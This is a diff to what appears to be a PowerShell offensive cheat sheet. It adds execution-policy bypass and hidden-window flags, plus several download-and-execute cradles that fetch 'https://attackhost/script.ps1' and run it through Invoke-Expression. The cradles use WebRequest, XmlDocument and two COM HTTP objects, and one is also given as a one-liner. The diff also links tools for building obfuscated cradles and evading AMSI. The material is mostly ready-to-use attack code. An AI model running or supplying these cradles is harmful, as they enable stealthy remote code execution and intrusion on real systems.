@@ -21,6 +21,8 @@
 * Use SSL when downloading scripts.
 * Use a script extension other than .ps1, such as .jpg.
 * Specify User-Agent with Net.WebClient
+* -ExecutionPolicy bypass
+* -Window hidden
 
 # Download File
 ### Download File To Disk
@@ -65,6 +67,40 @@ PS C:\> $payload = "https://attackhost/script.ps1"
 PS C:\> $command = $downloader.DownloadString($payload)
 PS C:\> Invoke-Expression $command
 ```
+##### Using Net.WebRequest
+```powershell
+PS C:\> $request = [System.Net.WebRequest]::Create("https://attackhost/script.ps1")
+PS C:\> $response = $request.GetResponse()
+PS C:\> $proxy = [Net.WebRequest]::GetSystemWebProxy()
+PS C:\> $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
+PS C:\> $request.Proxy = $proxy
+PS C:\> iex ([System.IO.StreamReader]($response.GetResponseStream())).ReadToEnd()
+```
+##### Using XmlDocument
+```powershell
+PS C:\> $xmldoc = New-Object System.Xml.XmlDocument
+PS C:\> $xmldoc.Load("https://attackhost/script.ps1")
+PS C:\> iex $xmldoc.command.a.execute
+```
+### Using COM Object
+##### MsXml2.XMLHTTP
+```powershell
+PS C:\> $downloader = New-Object -ComObject MsXml2.XMLHTTP
+PS C:\> $downloader.open("GET", "https://attackhost/script.ps1", false)
+PS C:\> $downloader.send()
+PS C:\> iex $downloader.responseText
+```
+##### WinHttp.WinHttp.5.1
+```powershell
+PS C:\> $downloader = New-Object -ComObject WinHttp.WinHttp.5.1
+PS C:\> $downloader.open("GET", "https://attackhost/script.ps1", false)
+PS C:\> $downloader.send()
+PS C:\> iex $downloader.responseText
+```
+##### As One-Liner
+```powershell
+PS C:\> $d=New-Object -ComObject WinHttp.WinHttp.5.1; $d.open("GET", "https://attackhost/script.ps1", false); $d.send(); iex $d.responseText
+```
 
 # Processes
 ##### Get list of processes running, sorted by name.
@@ -83,6 +119,9 @@ powershell Get-Service
 ```
 
 # [From Meterpreter](../../../Metasploit/README.MD#PowerShell)
+
+# Tools
+##### [Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)
 
 # References
 ##### [Generates obfuscated PowerShell snippets](https://amsi.fail/)
